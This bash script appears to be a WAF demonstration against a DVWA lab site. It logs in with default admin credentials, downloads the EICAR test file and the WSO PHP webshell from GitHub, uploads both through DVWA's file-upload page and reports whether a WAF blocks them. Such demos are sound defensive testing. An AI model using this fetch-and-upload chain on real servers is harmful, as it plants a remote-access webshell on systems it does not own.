#!/bin/bash

# Vars
DVWA_URL="https://dvwa1.labsec.ca"
DVWA_HOST="dvwa1.labsec.ca"
LOGIN_URL="${DVWA_URL}/login.php"
UPLOAD_URL="${DVWA_URL}/vulnerabilities/upload/"
COOKIE_FILE="cookie.txt"

# Temp files
TMP_EICAR="eicar_com.zip"
TMP_WSO="wso.php"

# Cleanup previous run
rm -f "$COOKIE_FILE" "$TMP_EICAR" "$TMP_WSO"

echo "==============================="
echo "🔗 DVWA URL:       $DVWA_URL"
echo "🔗 Login page:     $LOGIN_URL"
echo "🔗 Upload page:    $UPLOAD_URL"
echo "==============================="
echo ""

# 1. Download EICAR
echo "[1] 📥 Downloading EICAR test file..."
if curl -fsSL -o "$TMP_EICAR" "https://secure.eicar.org/eicar_com.zip"; then
    echo "✅ EICAR downloaded successfully."
else
    echo "❌ Failed to download EICAR."
    exit 1
fi
echo ""

# 2. Download WSO
echo "[2] 📥 Downloading WSO webshell..."
if curl -fsSL -o "$TMP_WSO" "https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/refs/heads/master/wso.php"; then
    echo "✅ WSO downloaded successfully."
else
    echo "❌ Failed to download WSO."
    exit 1
fi
echo ""

# 3. Get CSRF token
echo "[3] 🔐 Extracting CSRF token from login page..."
TOKEN=$(curl -s -c "$COOKIE_FILE" "${LOGIN_URL}" | grep -oP "name='user_token' value='\K[^']+")
if [ -z "$TOKEN" ]; then
    echo "❌ Failed to extract CSRF token."
    exit 1
fi
echo "✅ CSRF token retrieved: $TOKEN"
echo ""

# 4. Login
echo "[4] 🔑 Logging in to DVWA..."
curl -sS "${LOGIN_URL}" \
    -H "authority: ${DVWA_HOST}" \
    -H "cache-control: max-age=0" \
    -H "content-type: application/x-www-form-urlencoded" \
    -H "origin: ${DVWA_URL}" \
    -H "referer: ${DVWA_URL}/" \
    -H "user-agent: FortiWeb Demo Script" \
    --insecure \
    --data-raw "username=admin&password=password&Login=Login&user_token=${TOKEN}" \
    -b "$COOKIE_FILE" -c "$COOKIE_FILE" > /dev/null

# Verify login
echo "[5] ✅ Verifying login status..."
if curl -s -b "$COOKIE_FILE" "$DVWA_URL/index.php" | grep -q "logout.php"; then
    echo "✅ Login successful."
else
    echo "❌ Login failed."
    exit 1
fi
echo ""

# 6. Upload function
upload_file() {
    local FILE=$1
    echo "[6] 📤 Uploading file: $FILE"
    echo "→ Target URL: $UPLOAD_URL"
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "referer: ${UPLOAD_URL}" \
        -H "origin: ${DVWA_URL}" \
        -H "user-agent: File Security Demo Script" \
        -b "$COOKIE_FILE" \
        -F "uploaded=@$FILE" \
        -F "Upload=Upload" \
        "$UPLOAD_URL")

    echo "↪️ HTTP response code: $HTTP_CODE"

    if [ "$HTTP_CODE" == "200" ]; then
        echo "✅ Upload successful for $FILE"
    elif [ "$HTTP_CODE" == "403" ]; then
        echo "🛑 Upload failed for $FILE: blocked by WAF (HTTP 403)"
    else
        echo "⚠️ Upload failed for $FILE: HTTP $HTTP_CODE"
    fi
    echo ""
}

# Upload both files
upload_file "$TMP_EICAR"
upload_file "$TMP_WSO"

# Final cleanup
echo "[7] 🧹 Cleaning up temp files..."
rm -f "$COOKIE_FILE" "$TMP_EICAR" "$TMP_WSO"
echo "✅ Done."

